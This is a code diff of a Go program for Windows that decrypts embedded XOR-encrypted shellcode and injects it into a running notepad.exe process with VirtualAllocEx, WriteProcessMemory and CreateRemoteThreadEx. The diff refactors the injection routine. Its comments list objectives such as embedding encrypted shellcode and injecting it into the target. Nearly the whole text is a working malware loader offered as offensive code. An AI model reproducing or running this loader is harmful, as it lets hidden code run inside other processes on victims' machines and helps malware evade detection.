@@ -21,10 +21,10 @@ import (
 var enc_sc_b64 string
 
 var (
-	kernel32DLL        = win32.NewLazySystemDLL("kernel32.dll")
-	VirtualAllocEx     = kernel32DLL.NewProc("VirtualAllocEx")
-	WriteProcessMemory = kernel32DLL.NewProc("WriteProcessMemory")
-	CreateRemoteThread = kernel32DLL.NewProc("CreateRemoteThread")
+	kernel32             = win32.NewLazySystemDLL("kernel32.dll")
+	VirtualAllocEx       = kernel32.NewProc("VirtualAllocEx")
+	WriteProcessMemory   = kernel32.NewProc("WriteProcessMemory")
+	CreateRemoteThreadEx = kernel32.NewProc("CreateRemoteThreadEx")
 )
 
 type WindowsProcess struct {
@@ -131,43 +131,9 @@ func FindTarget(procname string) (pid uint32, err error) {
 
 }
 
-func Inject(hProc win32.Handle, payload []byte, payload_len int) {
+func Inject(pid uint32, sc []byte) {
 
-	baseAddress, _, errVirtualAllocEx := VirtualAllocEx.Call(uintptr(hProc), 0, uintptr(payload_len), win32.MEM_COMMIT, syscall.PAGE_EXECUTE_READ)
-
-	if errVirtualAllocEx.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!] ERR: calling VirtualAllocEx:\r\n%s", errVirtualAllocEx.Error()))
-	}
-
-	errWriteProcessMemory := win32.WriteProcessMemory(hProc, baseAddress, &payload[0], uintptr(len(payload)), nil)
-
-	checkError(errWriteProcessMemory)
-
-	_, _, errCreateRemoteThread := CreateRemoteThread.Call(uintptr(hProc), 0, 0, baseAddress, 0, 0, 0)
-
-	if errCreateRemoteThread.Error() != "The operation completed successfully." {
-		log.Fatal(fmt.Sprintf("[!] ERR: calling CreateRemoteThread:\r\n%s", errVirtualAllocEx.Error()))
-	}
-
-}
-
-func main() {
-	// objectives:
-	// [x] embed encrypted shellcode from file into program
-	// [x] decrypt shellcode (XOR)
-	// [x] inject shellcode into notepad.exe
-	// [ ] get rid of console window (pop up)
-
-	key := "42"
-	sc := decrypt_xor_shellcode(key, enc_sc_b64)
-
-	//Get PID of target process
-	pid, err := FindTarget("notepad.exe")
-
-	// Process is not found or other error
-	if err != nil {
-		os.Exit(42)
-	}
+	sc_len := uintptr(len(sc))
 
 	// Try to open the target process
 	hProc, err := win32.OpenProcess(
@@ -182,6 +148,45 @@ func main() {
 
 	checkError(err)
 
-	Inject(hProc, sc, len(sc))
+	baseAddress, _, errVirtualAllocEx := VirtualAllocEx.Call(uintptr(hProc), 0, sc_len, win32.MEM_COMMIT, syscall.PAGE_EXECUTE_READ)
+
+	errWriteProcessMemory := win32.WriteProcessMemory(hProc, baseAddress, &sc[0], sc_len, nil)
+
+	checkError(errWriteProcessMemory)
+
+	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(hProc), 0, 0, baseAddress, 0, 0, 0)
+
+	if errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!] ERR: calling CreateRemoteThread:\r\n%s", errVirtualAllocEx.Error()))
+	}
+
+	win32.CloseHandle(hProc)
+
+}
+
+func main() {
+	// objectives:
+	// [x] embed encrypted shellcode from file into program
+	// [x] decrypt shellcode (XOR)
+	// [x] inject shellcode into notepad.exe
+
+	key := "42"
+	targetProc := "notepad.exe"
+	sc := decrypt_xor_shellcode(key, enc_sc_b64)
+
+	//Get PID of target process
+	pid, err := FindTarget(targetProc)
+
+	// Process is not found or other error
+	if err != nil {
+		fmt.Println(err)
+		os.Exit(1)
+	}
+
+	// Inject with
+	// - VirtualAllocEx
+	// - WriteProcessMemory
+	// - CreateRemoteThreadEx
+	Inject(pid, sc)
 
 }
